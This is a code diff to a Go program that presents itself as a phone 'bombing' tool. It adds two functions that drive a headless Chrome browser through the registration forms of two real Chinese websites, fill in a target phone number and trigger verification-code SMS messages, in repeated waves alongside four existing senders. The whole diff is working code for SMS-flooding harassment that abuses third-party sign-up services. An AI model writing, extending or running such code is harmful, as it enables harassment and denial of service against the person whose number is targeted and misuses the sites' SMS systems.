@@ -56,11 +56,13 @@ func main() {
 		fmt.Println("轰炸任务开始执行，当前波次[", i+1, "]")
 
 		// 添加任务
-		waitGroup.Add(4)
+		waitGroup.Add(6)
 		go ddjbSendCode() // 多多进宝
 		go jlmfSenCode()  // 居里买房
 		go wbtcSendCode() // 58同城
 		go ltdSendCode()  // LTD营销云
+		go dhlSendCode()  // 订花乐
+		go xrsSendCode()  // 学而思
 	}
 
 	waitGroup.Wait()
@@ -235,6 +237,7 @@ func wbtcSendCode() {
 // LTD营销云
 func ltdSendCode() {
 	var (
+		// 登录页面
 		loginUrl = `https://wei.ltd.com/user/#/auth/login?redirect=%2Fhome`
 
 		// 手机号
@@ -281,4 +284,115 @@ func ltdSendCode() {
 	}
 
 	fmt.Println(currentTime()+"LTD营销云验证码发送失败", timepiece)
+}
+
+// 订花乐
+func dhlSendCode() {
+	var (
+		// 首页地址
+		homeUrl = `https://www.dinghuale.com`
+
+		// 注册按钮
+		registerPath = `#miao > div > div.header-top > div.container.clearfix > div.con-right.fr > a.fl.text-color-logo.align-center`
+
+		// 手机号输入
+		mobilePhonePath = `#regisMobile`
+
+		// 发送验证码
+		sendCodePath = `#shoujizhucepage > div.registration-formcont > div:nth-child(2) > div`
+
+		// 计时器
+		timepiece string
+	)
+
+	ctx, _ := chromedp.NewExecAllocator(context.Background(), append(
+		chromedp.DefaultExecAllocatorOptions[:],
+		chromedp.Flag("blink-settings", "imagesEnabled="+strconv.FormatBool(isLoadImg)), // 不显示图片
+		chromedp.Flag("headless", isHeadless),
+		chromedp.UserAgent(userAgent),
+	)...)
+
+	ctx, _ = context.WithTimeout(ctx, 30*time.Second)
+	ctx, _ = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))
+
+	// 关闭浏览器
+	defer chromedp.Cancel(ctx)
+	defer waitGroup.Done()
+
+	err := chromedp.Run(ctx,
+		chromedp.Navigate(homeUrl),
+		chromedp.WaitVisible(registerPath),
+		chromedp.Click(registerPath),
+		chromedp.WaitVisible(mobilePhonePath, chromedp.ByID),
+		chromedp.SendKeys(mobilePhonePath, phoneNum, chromedp.ByID),
+		chromedp.Click(sendCodePath),
+		chromedp.Sleep(2*time.Second),
+		chromedp.Text(sendCodePath, &timepiece),
+	)
+
+	if err != nil {
+		fmt.Println(currentTime()+"订花乐验证码发送失败", timepiece, err.Error())
+		return
+	}
+
+	// 56秒后可重发验证码
+	if strings.Contains(timepiece, "秒后重新发送") {
+		fmt.Println(currentTime()+"订花乐验证码发送成功", timepiece)
+		return
+	}
+
+	fmt.Println(currentTime()+"订花乐验证码发送失败", timepiece)
+}
+
+// 学而思
+func xrsSendCode() {
+	var (
+		// 首页
+		homeUrl = `https://hz.jiajiaoban.cn/pc/zz/index.html?utm_source=bd&utm_campaign=0571&bd_vid=8699081827648847238`
+
+		// 手机号输入
+		mobilePhonePath = `#izk-sign-content-tel`
+
+		// 发送验证码
+		sendCodePath = `#izk-part-signup > form > div > div:nth-child(2) > div.izk-sign-content-row-input-container.icon-name.smscode-select-wrap > div`
+
+		// 计时器
+		timepiece string
+	)
+
+	ctx, _ := chromedp.NewExecAllocator(context.Background(), append(
+		chromedp.DefaultExecAllocatorOptions[:],
+		chromedp.Flag("blink-settings", "imagesEnabled="+strconv.FormatBool(isLoadImg)), // 不显示图片
+		chromedp.Flag("headless", isHeadless),
+		chromedp.UserAgent(userAgent),
+	)...)
+
+	ctx, _ = context.WithTimeout(ctx, 30*time.Second)
+	ctx, _ = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))
+
+	// 关闭浏览器
+	defer chromedp.Cancel(ctx)
+	defer waitGroup.Done()
+
+	err := chromedp.Run(ctx,
+		chromedp.Navigate(homeUrl),
+		chromedp.WaitVisible(mobilePhonePath, chromedp.ByID),
+		chromedp.SendKeys(mobilePhonePath, phoneNum, chromedp.ByID),
+		chromedp.Click(sendCodePath),
+		chromedp.Sleep(2*time.Second),
+		chromedp.Text(sendCodePath, &timepiece),
+	)
+
+	if err != nil {
+		fmt.Println(currentTime()+"学而思验证码发送失败", timepiece, err.Error())
+		return
+	}
+
+	// 56秒后可重发验证码
+	if strings.Contains(timepiece, "s") {
+		fmt.Println(currentTime()+"学而思验证码发送成功", timepiece)
+		return
+	}
+
+	fmt.Println(currentTime()+"学而思验证码发送失败", timepiece)
 }
